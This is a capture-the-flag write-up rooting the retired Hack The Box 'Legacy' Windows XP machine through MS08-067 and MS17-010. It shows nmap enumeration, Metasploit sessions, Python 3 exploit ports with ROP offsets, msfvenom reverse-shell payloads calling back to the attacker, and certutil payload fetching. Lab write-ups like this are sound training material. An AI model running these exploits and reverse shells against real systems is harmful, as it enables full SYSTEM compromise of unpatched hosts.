---
title: "Hack The Box: Legacy"
date: 2026-07-12
ref: WU-002
summary: "Rooting the retired HTB 'Legacy' machine — enumerating SMB on Windows XP SP3, discovering two CVEs with NSE scripts, validating both MS08-067 and MS17-010 with Metasploit and learning from the process, manually exploiting both using ported Python 3 scripts."
tags: [hack-the-box, smb, ms08-067, ms17-010, windows, metasploit]
---

## Description

**Legacy** is an easy Windows machine on Hack The Box designed to teach the
fundamentals of Windows enumeration and SMB exploitation. The assessment involves
identifying exposed SMB services, performing reconnaissance with Nmap, researching
known vulnerabilities, and exploiting an outdated Windows system to gain
administrative access. It reinforces the importance of thorough enumeration,
vulnerability validation, and understanding the risks associated with unpatched
legacy systems.

**Retired machine — `legacy.htb`**

- **IP Address:** 10.129.227.181
- **Operating System:** Windows XP SP3
- **Architecture:** x86

**Credentials:** None required.

**Nmap**

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-12 10:38 EDT
Nmap scan report for 10.129.227.181
Host is up (0.027s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:c1:09:c6 (unknown)
|_clock-skew: mean: 5d00h27m35s, deviation: 2h07m16s, median: 4d22h57m35s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-07-17T19:35:53+03:00

Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds
```

**Quick services**

| Port | Service                  |
|------|--------------------------|
| 135  | Microsoft RPC            |
| 139  | NetBIOS                  |
| 445  | SMB (Windows XP / SMBv1) |

**Completion status**

- User flag: captured
- Root flag: captured
- Completion: Complete (100%)

## Enumeration

A quick connectivity check confirms we can reach the target. The TTL in the ping
response is 127, which tells us two things: the machine is a single hop away, and
it is Windows-based (Windows defaults to a TTL of 128, so one hop consumed gives
us 127).

```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Legacy]
└─$ ping -c 3 10.129.227.181
PING 10.129.227.181 (10.129.227.181) 56(84) bytes of data.
64 bytes from 10.129.227.181: icmp_seq=1 ttl=127 time=23.7 ms
64 bytes from 10.129.227.181: icmp_seq=2 ttl=127 time=23.3 ms
64 bytes from 10.129.227.181: icmp_seq=3 ttl=127 time=23.3 ms

--- 10.129.227.181 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2005ms
rtt min/avg/max/mdev = 23.287/23.433/23.724/0.205 ms
```

With connectivity confirmed, we run a Nmap service and version scan across the default
port range and find three open ports.

```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Legacy]
└─$ nmap -sCV -oA Scans/Nmap-Service+Version 10.129.227.181

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
```

For now this is plenty enough to work with. If nothing interesting is found from these results we can
widen or adjust the scanning paramaters accordingly.

## SMB

The Nmap scripts flagged guest-level access, so we check whether null
authentication is possible using two tools. Both confirm it is not and we move on.

```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Legacy]
└─$ smbclient -N -L //10.129.227.181
session setup failed: NT_STATUS_INVALID_PARAMETER

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Legacy]
└─$ netexec smb 10.129.227.181 -u '' -p '' --shares
SMB  10.129.227.181  445  LEGACY  [*] Windows 5.1 x32 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB  10.129.227.181  445  LEGACY  [+] legacy\:
SMB  10.129.227.181  445  LEGACY  [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

The machine is running SMBv1 on Windows XP — a combination with a long history
of critical vulnerabilities. We run Nmap's SMB vulnerability scripts using the
`smb-vuln-*` wildcard to test all available checks at once.

```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Legacy]
└─$ nmap -p 139,445 --script smb-vuln-* 10.129.227.181

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14
|
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|     Disclosure date: 2008-10-23

Nmap done: 1 IP address (1 host up) scanned in 5.39 seconds
```

We get hits on two exploits: the older MS08-067 and MS17-010. Both are
well-documented, which gives us an excellent opportunity to explore each path in
depth.

## MS08-067

MS08-067 is a critical remote code execution vulnerability in the Microsoft
Windows Server service, disclosed in 2008. It allows unauthenticated attackers
to send a specially crafted RPC request and take complete control of a target
machine with SYSTEM privileges.

> **Interesting fact**
>
> MS08-067 is the vulnerability that powered the infamous **Conficker** worm,
> which infected millions of machines worldwide starting in late 2008.

We have multiple ways of deploying this exploit. Following our usual approach,
we will start with Metasploit to understand the mechanics and then attempt manual
exploitation.

### Metasploit

Loading Metasploit with the `-q` flag skips the banner. Searching `ms08-067`
returns a single module with several target (many removed for brevity) sub-options — one for each Windows
version it supports.

```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Legacy]
└─$ msfconsole -q
msf > search ms08-067

Matching Modules
================

   #  Name                                      Disclosure Date  Rank   Check  Description
   -  ----                                      ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi       2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   1    \_ target: Automatic Targeting          .                .      .      .
   2    \_ target: Windows 2000 Universal       .                .      .      .
   3    \_ target: Windows XP SP0/SP1 Universal .                .      .      .
   4    \_ target: Windows 2003 SP0 Universal   .                .      .      .
   5    \_ target: Windows XP SP2 English (AlwaysOn NX)         .      .      .
<------------------------------------------------------ Results Ommited For Brevity ------------------------------------------------------------>
```

Before selecting a target it is worth understanding what the three variables in
each option mean, because this matters heavily when exploiting manually. When
selecting a target, you need to know the service pack, the language, and the DEP
state — either `No NX`, `NX`, or `AlwaysOn NX`. Get any one of these wrong and
you will either crash the service or get no shell.

```text
Windows XP [Service Pack] [Language] (NX/DEP Status)
```

For now we select `Automatic Targeting` and let Metasploit do the heavy lifting. We check
the required options with `show options`, set `RHOSTS` to the target, and point
`LHOST` at our `tun0` adapter.

```bash
msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.129.227.181
RHOSTS => 10.129.227.181
msf exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
LHOST => 10.10.14.75
msf exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.75:4444
[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
[*] Meterpreter session 1 opened (10.10.14.75:4444 -> 10.129.227.181:1033) at 2026-07-12 11:19:17 -0400

meterpreter > shell
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>echo %username%
LEGACY$
```

We get a Meterpreter session and drop into a shell. `whoami` is missing on this
old XP build, but `echo %username%` returns `LEGACY$` — the dollar sign suffix
indicates the machine account rather than a user account, confirming we are
running as SYSTEM.

The most important output is in the lines before the session opens: Metasploit's
own fingerprinting identified "Windows XP — Service Pack 3 — English" and
automatically selected the `AlwaysOn NX` target. The module tries `AlwaysOn NX`
first as the most conservative assumption — if DEP is disabled or in an optional
state it will fall through to a simpler path, so starting with the hardest case
is a safe default.

### Understanding the exploitation

With the target confirmed, we can explore why so many versions of the exploit
exist. We start with a version we know will fail, because looking at a controlled
failure is often more instructive than taking an easy win.

```text
https://www.exploit-db.com/exploits/7132
```

This exploit only targets Windows 2000 and Server 2003 SP2. We port it to Python
3, run it against our XP SP3 target, and watch it fail as expected.

```bash
┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS08-067]
└─$ python3 exploit.py 10.129.227.181 2
[-]Windows 2003[SP2] payload loaded
[-]Initiating connection
[-]connected to ncacn_np:10.129.227.181[\pipe\browser]
[-]Exploit sent to target successfully...
[1]Now connect to port 4444 on the target: nc <target> 4444

┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS08-067]
└─$ nc 10.129.227.181 4444
(UNKNOWN) [10.129.227.181] 4444 (?) : Connection refused

┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS08-067]
└─$ nmap -p 4444 10.129.227.181
PORT     STATE  SERVICE
4444/tcp closed krb524
```

This fails because the exploit has hardcoded return addresses for Win 2000 and
Server 2003 SP2 memory layouts. On XP SP3 we are jumping into uninitialised
memory and crashing `netapi32.dll` rather than executing our shellcode.

Inspecting the Metasploit module that did work reveals what it does differently.

```bash
┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS08-067]
└─$ find / -name "ms08_067_netapi.rb" 2>/dev/null
/usr/share/metasploit-framework/modules/exploits/windows/smb/ms08_067_netapi.rb

┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS08-067]
└─$ cat /usr/share/metasploit-framework/modules/exploits/windows/smb/ms08_067_netapi.rb
```

The relevant section shows no simple return address. Instead it uses a full ROP
stager built from gadgets inside `ACGENRAL.DLL`.

```ruby
'Windows XP SP3 English (AlwaysOn NX)',
{
  'Scratch' => 0x00020408,
  'UseROP' => '5.1.2600.5512'
}
```

```ruby
rvasets['5.1.2600.5512'] = {
  'call_HeapCreate' => 0x21286,
  'add eax, ebp / ...' => 0x2e796,
  ...
}
```

With `AlwaysOn NX` active, the CPU refuses to execute code on the stack, so a
simple stack smash does not work. Metasploit instead:

1. Uses a ROP chain to call `HeapCreate` and allocate RWX memory.
2. Copies the shellcode into that memory.
3. Jumps to it.

The gadgets above are chained from inside `ACGENRAL.DLL` to get executable memory
without the stack ever needing to be executable.

One more useful observation: how Metasploit auto-detects the exact target. It
calls its own `smb_fingerprint` method, which is significantly more aggressive
than Nmap's OS detection.

```ruby
fprint = smb_fingerprint
print_status("Fingerprint: #{fprint['os']} - #{fprint['sp']} - lang:#{fprint['lang']}")
```

During NTLMSSP negotiation, the SMB handshake exposes the exact Windows build
number — not just "XP" but the precise build string such as `5.1.2600.5512`.
Metasploit reads that directly and maps it to a service pack:

```text
5.1.2600.2180 → XP SP2
5.1.2600.5512 → XP SP3
```

### Manual exploitation

Now that we understand the exploit path, we look for a Python exploit we can
adapt. We find an excellent version from Jivoi that already has the ROP portions
ported from the Metasploit module.

```text
https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
```

The banner confirms this is a modified version of Debasis Mohanty's original,
with the return addresses and ROP chain sourced directly from the Metasploit
module.

```python
print('#   MS08-067 Exploit')
print('#   This is a modified version of Debasis Mohanty\'s code.')
print('#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi')
```

Checking the target list, option 7 matches our machine and the ROP gadget offsets
match the Metasploit source exactly.

```python
# Option 7 — Windows XP SP3 English (AlwaysOn NX)
rvasets = { 'call_HeapCreate': 0x21286, ... 'add eax, 8 / ret': 0x29c64 }
```

This is also Python 2, so we port it to Python 3 with updated impacket API
calls. We also simplify the shellcode section: rather than keeping the original
hardcoded payload, we clear the buffer and add generation instructions at the top.
The ported script is available [here](https://github.com/Hackopotamus/Hack-The-Box-Exploit-Ports-and-Fixes/tree/main/Legacy/MS08-067).

```python
#!/usr/bin/env python3

#######################################################################
#   MS08-067 Exploit
#   Modified version of Debasis Mohanty's code.
#   ROP parts ported from metasploit module exploit/windows/smb/ms08_067_netapi
#   Mod in 2018 by Andy Acer
#   Updated to Python 3 in 2026 by Hackopotamus
#   Usage: python3 ms08_067_py3.py <target ip> <os #> <port #>
#   For HTB Legacy: python3 ms08_067_py3.py <IP> 7 445
#######################################################################

import struct, time, sys
from threading import Thread

try:
    from impacket import smb, uuid
    from impacket.dcerpc.v5 import transport
except ImportError:
    print('Install impacket: pip install impacket')
    sys.exit(1)

# ------------------------------------------------------------------------
# STEP 1: Generate shellcode and paste the output below.
#
# msfvenom -p windows/shell_reverse_tcp LHOST=<TUN0_IP> LPORT=4444 \
#   EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" \
#   -f py -a x86 --platform windows
#
# Replace buf = b"" below with the full msfvenom output.
# The variable MUST be named buf.
# ------------------------------------------------------------------------

buf = b""  # <-- Replace with msfvenom output

# Pad shellcode + NOPs to exactly 410 bytes
num_nops = 410 - len(buf)
shellcode = b"\x90" * num_nops + buf

module_base = 0x6f880000
```

We generate our shellcode with `msfvenom`, using the bad-character list from the
script's header to avoid breaking the exploit, and paste the output into `buf`.

![The msfvenom shellcode pasted into the buf variable in the Python 3 exploit]({{ '/assets/img/htb-legacy/ms08-067-buffer.png' | relative_url }})

With a netcat listener ready and the modified code saved, we run the exploit using option `7` and catch a shell.

```bash
┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS08-067]
└─$ python3 hippo.py 10.129.227.181 7 445
Windows XP SP3 English (AlwaysOn NX)

[-]Initiating connection
[-]connected to ncacn_np:10.129.227.181[\pipe\browser]
Exploit finish


┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Legacy]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.75] from (UNKNOWN) [10.129.227.181] 1032
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

> **Note on box resets** — the earlier failed exploit attempt crashed
> `netapi32.dll`, making the service unresponsive. A machine reset was required
> before this run.

That completes MS08-067 using multiple methods. Next, we can move on to the second 
exploit path available to us.

## MS17-010

MS17-010 is a critical security bulletin released by Microsoft in March 2017,
addressing multiple vulnerabilities in SMBv1. The most severe allows
unauthenticated remote code execution by sending a Specially crafted SMB packets 
packet to a target, resulting in full SYSTEM-level access.

> **Interesting fact**
>
> The EternalBlue exploit (MS17-010) was originally developed and weaponised by
> the NSA as part of its offensive cyber operations. After being stolen and leaked
> by the Shadow Brokers in April 2017, Microsoft released patches — but many
> systems remained unpatched. EternalBlue went on to fuel some of the most
> destructive cyberattacks in history, including the **WannaCry** ransomware
> outbreak and the **NotPetya** malware campaign. It remains one of the most
> consequential examples of a leaked nation-state cyberweapon causing global harm.

Given that this machine is vulnerable to MS08-067, it is unsurprising that
MS17-010 also works here — both exploit SMBv1. Many of the same factors apply,
so we can streamline our approach.

### Metasploit

Searching for `MS17-010` in Metasploit returns a broad list of modules, most of
which are not compatible with Windows XP. After testing several options, we settle
on `ms17_010_psexec` using the **MOF upload** targeting type.

> **What is a MOF file?**
>
> A Windows MOF (Managed Object Format) file is a text-based script used by
> Windows Management Instrumentation (WMI) to define classes and configure
> system settings. Because WMI processes MOF files automatically at import, this
> method bypasses service-based binary execution entirely.
>
> **Why we use a MOF upload?**
>
> When we initially tried `Automatic` and `Native upload`, we received
> `ERROR_CODE: 193` (`ERROR_BAD_EXE_FORMAT`) even when specifying the
> correct x86 architecture. This means the service created by the psexec method
> cannot execute the binary on this XP build. MOF upload sidesteps the problem
> entirely — instead of running an executable as a service, it drops a WMI MOF
> file that Windows processes automatically.


Once selected, we can then set up the targeting requirements for the module as we would do normally.

```bash
msf > use 14
[*] Additionally setting TARGET => MOF upload
msf exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.227.181
RHOSTS => 10.129.227.181
msf exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
```


Running this module successfully gives us a shell on the system and we can use `ipconfig` to show proof.

```bash
msf exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.75:4444
[*] 10.129.227.181:445 - Target OS: Windows 5.1
[+] 10.129.227.181:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.227.181:445 - Uploading MOF...
[*] 10.129.227.181:445 - Created %SystemRoot%\system32\wbem\mof\P8M8Ud6ifUNEvL.MOF
[*] Meterpreter session 1 opened (10.10.14.75:4444 -> 10.129.227.181:1032)

meterpreter > ipconfig

Interface 65539
============
Name         : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
IPv4 Address : 10.129.227.181
```

### MS17-010 command execution

There is also the auxiliary module `auxiliary/admin/smb/ms17_010_command` that
can run commands directly on the system. We explore this briefly before running
into a dead end and moving on to manual exploitation.

![Metasploit ms17_010_command module options]({{ '/assets/img/htb-legacy/ms17-010-show-options.png' | relative_url }})

We set `RHOSTS` and use the `COMMAND` option to test RCE with a ping back to our machine.

```bash
msf auxiliary(admin/smb/ms17_010_command) > set COMMAND 'ping -n 3 10.10.14.75'
msf auxiliary(admin/smb/ms17_010_command) > run

[+] 10.129.227.181:445 - Overwrite complete... SYSTEM session obtained!
[+] 10.129.227.181:445 - Command completed successfully!
[*] Output for "ping -n 3 10.10.14.75":

Pinging 10.10.14.75 with 32 bytes of data:
Reply from 10.10.14.75: bytes=32 time=24ms TTL=63
Reply from 10.10.14.75: bytes=32 time=22ms TTL=63
```

We also get hits on our attacker machine, we use `tcpdump` to see the incoming ICMP requests that validate 
command execution is possible.

```bash
┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS17-010]
└─$ sudo tcpdump -i tun0 icmp
05:36:18.654027 IP 10.129.227.181 > 10.10.14.75: ICMP echo request, id 512, seq 256, length 40
05:36:18.654039 IP 10.10.14.75 > 10.129.227.181: ICMP echo reply, id 512, seq 256, length 40
05:36:19.653894 IP 10.129.227.181 > 10.10.14.75: ICMP echo request, id 512, seq 512, length 40
05:36:20.654056 IP 10.129.227.181 > 10.10.14.75: ICMP echo request, id 512, seq 768, length 40
```

RCE is confirmed, but attempts to convert this into a full interactive session all
failed. Methods attempted:

- Creating a new user and adding it to the Administrators group via the `net` command.
- Resetting the Administrator account password also using the `net` command.
- Attempted to chain both above methods by connecting via Impacket's WMIexec and PSExec modules with both been disallowed.
- Generating a 32-bit shell with `msfvenom`, hosting it on a Python HTTP server, and fetching it with `certutil`.
- No hits on the HTTP server were ever seen meaning the method failed.

> **Hindsight is a wonderful thing**
> 
>  At the time of editing and refining the post, it hit me very blatantly that I should have used SMB server and either
>  hosted the reverse shell and called it remotely, or sent the file and used the module to execute it after placement.
>  Oh well, hindsight is a wonderful thing after all.

In the interest of time, let's move on to a manual approach instead.

### Manual exploitation

We clone a fork of [Worawit's](https://github.com/worawit/MS17-010) repository by 
[helviojunior](https://github.com/helviojunior/MS17-010), which includes a `send_and_execute.py` script that exploits 
the vulnerability and runs an arbitrary binary on the target.

```bash
┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS17-010]
└─$ git clone https://github.com/helviojunior/MS17-010.git
└─$ mv MS17-010 helviojunior && cd helviojunior

┌──(kali㉿kali)-[~/…/Legacy/Exploit/MS17-010/helviojunior]
└─$ ls
checker.py  send_and_execute.py  mysmb.py  zzz_exploit.py  ...
```

We generate a 32-bit reverse shell executable using `msfvenom` and then set up a listener using `nc` for later.

```bash
┌──(kali㉿kali)-[~/…/Legacy/Exploit/MS17-010/helviojunior]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.75 LPORT=443 -f exe -o rev.exe
[-] No arch selected, selecting arch: x86 from the payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe

┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS17-010]
└─$ nc -lvnp 443
listening on [any] 443 ...
```

The original script requires Python 2 and the correct impacket modules, this is pain to set-up given version 2's deprecated state,
so we port it to Python 3 instead. The full ported version is hosted [here](https://github.com/Hackopotamus/Hack-The-Box-Exploit-Ports-and-Fixes/tree/main/Legacy/MS17-010).
The key changes from the original are:

```python
#!/usr/bin/env python3
# Key Python 3 changes vs the original:
# - All byte strings use b'' literals throughout
# - struct pack/unpack calls use explicit byte encoding
# - impacket API calls updated to current signatures
# - conn.send_echo(b'a') instead of conn.send_echo('a')
```

Running the exploit is successful and we get a call back to our netcat listener, landing us a shell on Legacy.

```bash
┌──(kali㉿kali)-[~/…/Legacy/Exploit/MS17-010/helviojunior]
└─$ python3 send_and_execute.py 10.129.227.181 rev.exe
Trying to connect to 10.129.227.181:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
success controlling one transaction
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting token UserAndGroups
Sending file KNCBDP.exe...
Opening SVCManager on 10.129.227.181.....
Creating service jyMY.....
Starting service jyMY.....


┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS17-010]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.75] from (UNKNOWN) [10.129.227.181] 1043
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>ipconfig

Ethernet adapter Local Area Connection:

        IP Address. . . . . . . . . . . . : 10.129.227.181
        Subnet Mask . . . . . . . . . . . : 255.255.0.0
        Default Gateway . . . . . . . . . : 10.129.0.1
```

## Obtaining the flags

With a SYSTEM-level access shell from either of the above exploit paths (manual or automatic), we locate the
flags with the `dir` command and read them with `type` to show their contents.

```bash
C:\WINDOWS\system32>dir C:\ /s /b /a:-d 2>nul | find "root.txt"
C:\Documents and Settings\Administrator\Desktop\root.txt

C:\WINDOWS\system32>dir C:\ /s /b /a:-d 2>nul | find "user.txt"
C:\Documents and Settings\john\Desktop\user.txt

C:\WINDOWS\system32>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
[root flag redacted]

C:\WINDOWS\system32>type "C:\Documents and Settings\john\Desktop\user.txt"
[user flag redacted]
```

## Beyond root

** Fixing the missing whoami binary**

Windows XP does not ship with `whoami.exe` in the default installation, which is
why the command failed earlier. We work around this by hosting the binary from our
attacker machine via an Impacket SMB server and calling it remotely from the
target.

```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Legacy]
└─$ locate whoami.exe
/usr/share/windows-resources/binaries/whoami.exe

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Legacy]
└─$ impacket-smbserver kali /usr/share/windows-binaries/
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

Calling the binary over the remote share confirms we are running as NT AUTHORITY\SYSTEM.

```bash
C:\WINDOWS\system32>\\10.10.14.75\kali\whoami.exe
NT AUTHORITY\SYSTEM
```

That wraps up the Legacy machine — rooted via both MS08-067 and MS17-010, with
Python 2-to-3 ports of each exploit and a look at how ROP chains and MOF upload
sidestep the defences on a Windows XP SP3 target.
